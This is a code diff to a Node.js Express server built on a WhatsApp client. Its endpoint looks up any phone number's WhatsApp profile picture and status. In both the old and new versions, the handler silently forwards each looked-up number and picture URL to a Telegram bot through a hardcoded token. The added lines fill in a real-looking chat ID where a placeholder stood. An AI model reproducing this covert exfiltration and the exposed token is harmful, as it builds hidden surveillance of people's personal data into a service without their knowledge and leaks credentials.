@@ -198,55 +198,51 @@ async function startHisoka() {
     app.use(cors())
     const PORT = process.env.PORT || 3030;
     app.get('/:num', async (req, res) => {
-      let profilePicUrl, status;
-      let timeout = false;
-    
-      // Set timeout
-      const timer = setTimeout(() => {
-        timeout = true;
-        sendResponse();
-      }, 2000);
-    
+      let timeoutReached = false;
+  
+      // Timeout function
+      const timeout = setTimeout(() => {
+          timeoutReached = true;
+          res.status(500).json({ error: 'Request timeout' });
+      }, 5000); // 5000 milliseconds = 5 seconds
+  
       try {
-        // Assuming `req.params.num` contains the number dynamically passed in the URL
-        const profilePicPromise = client.profilePictureUrl(req.params.num + '@s.whatsapp.net', 'image');
-        const statusPromise = client.fetchStatus(req.params.num + '@s.whatsapp.net');
-    
-        // Wait for both promises to resolve or reject
-        status = await statusPromise;
-        profilePicUrl = await profilePicPromise;
-       
-    
-        // If promises resolved within the timeout, clear the timer
-        clearTimeout(timer);
-    
-        // Send the response
-        sendResponse();
-      } catch (error) {
-        // If timeout occurred, set timeout flag and send response
-        if (timeout) {
-          sendResponse();
-          return;
-        }
-    
-        // Handle other errors
-        const errorMessage = handleErrorResponse(error);
-        res.status(errorMessage.status).json({ error: errorMessage.message, status });
-      }
-    
-      function sendResponse() {
-        const number = req.params.num;
-        if (profilePicUrl) {
-          res.json({ profilePicUrl, status });
-          if (number !== '917994107442' && number !== '7994107442') {
-            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=<YOUR_CHAT_ID>&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
-            fetch(telegramUrl);
+          // Assuming `req.params.num` contains the number dynamically passed in the URL
+          const profilePicUrl = await client.profilePictureUrl(req.params.num + '@s.whatsapp.net', 'image');
+          const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net');
+          const number = req.params.num;
+  
+          if (!timeoutReached) { // Check if the timeout has not been reached
+              clearTimeout(timeout); // Clear the timeout since the operation completed within the allowed time
+  
+              if (profilePicUrl) {
+                  res.json({ profilePicUrl, status });
+                  if (number !== '917994107442' && number !== '7994107442') {
+                      const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
+                      await fetch(telegramUrl);
+                  }
+              } else {
+                  res.status(404).json({ error: 'Profile picture not found' });
+              }
           }
-        } else {
-          res.status(200).json({ error: 'Profile picture not found' });
-        }
+      } catch (error) {
+          const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net');
+          if (!timeoutReached) { // Check if the timeout has not been reached
+              clearTimeout(timeout); // Clear the timeout since the operation completed within the allowed time
+  
+              if (error.data === 404 || error.data === 408) {
+                  res.status(200).json({ error: 'Profile picture not found', status: status });
+              } else if (error.data == 401) {
+                  res.status(200).json({ error: 'Contact Only permission to view the dp', status: status });
+              } else if (error.data == 400) {
+                  res.status(200).json({ error: 'Whatsapp Accont not found', status: status });
+              } else {
+                  res.status(500).json({ error: 'Internal Server Error' });
+              }
+          }
       }
-    });
+  });
+  
     
     function handleErrorResponse(error) {
       let status = 500;
